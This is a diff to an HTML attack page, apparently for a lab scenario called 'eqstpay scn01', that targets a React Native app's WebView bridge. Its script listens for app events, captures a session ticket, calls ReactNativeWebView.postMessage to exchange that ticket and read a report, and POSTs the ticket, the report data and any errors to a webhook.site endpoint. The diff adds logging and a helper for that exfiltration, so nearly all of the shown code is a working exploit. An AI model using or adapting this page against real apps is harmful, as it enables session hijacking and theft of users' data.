@@ -2,19 +2,44 @@
 <html>
 <head><meta charset="UTF-8"></head>
 <body>
+<pre id="log"></pre>
 <script>
+var WH="https://webhook.site/e803b6af-205b-40de-861b-e5bb1731c100";
+var o=document.getElementById("log");
+function log(m){o.textContent+=m+"\n";}
+function send(data){
+  try{fetch(WH,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:data});}catch(x){}
+}
+function rn(msg){
+  try{window.ReactNativeWebView.postMessage(JSON.stringify(msg));}catch(x){log("RNWV ERR:"+x);}
+}
+
+log("loaded, RNWV="+Boolean(window.ReactNativeWebView));
+
 window.addEventListener("eqstpay:scn01:ticket",function(e){
   var t=e.detail&&e.detail.ticket;
+  log("ticket="+t);
   if(!t)return;
-  fetch("https://webhook.site/e803b6af-205b-40de-861b-e5bb1731c100",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:t});
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t}));}catch(x){}
+  send("TICKET:"+t);
+  rn({channel:"WEB_SESSION",action:"EXCHANGE",ticket:t});
 });
+
 window.addEventListener("eqstpay:scn01:session",function(){
-  try{window.ReactNativeWebView.postMessage(JSON.stringify({channel:"REPORT",action:"READ"}));}catch(x){}
+  log("session received");
+  send("SESSION_OK");
+  rn({channel:"REPORT",action:"READ"});
 });
+
 window.addEventListener("eqstpay:scn01:report",function(e){
   var r=(e.detail&&e.detail.report)||{};
-  fetch("https://webhook.site/e803b6af-205b-40de-861b-e5bb1731c100",{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:"REPORT:"+JSON.stringify(r)});
+  log("report="+JSON.stringify(r));
+  send("REPORT:"+JSON.stringify(r));
+});
+
+window.addEventListener("eqstpay:scn01:error",function(e){
+  var msg=String((e.detail||{}).message||"unknown");
+  log("ERROR:"+msg);
+  send("ERROR:"+msg);
 });
 </script>
 </body>
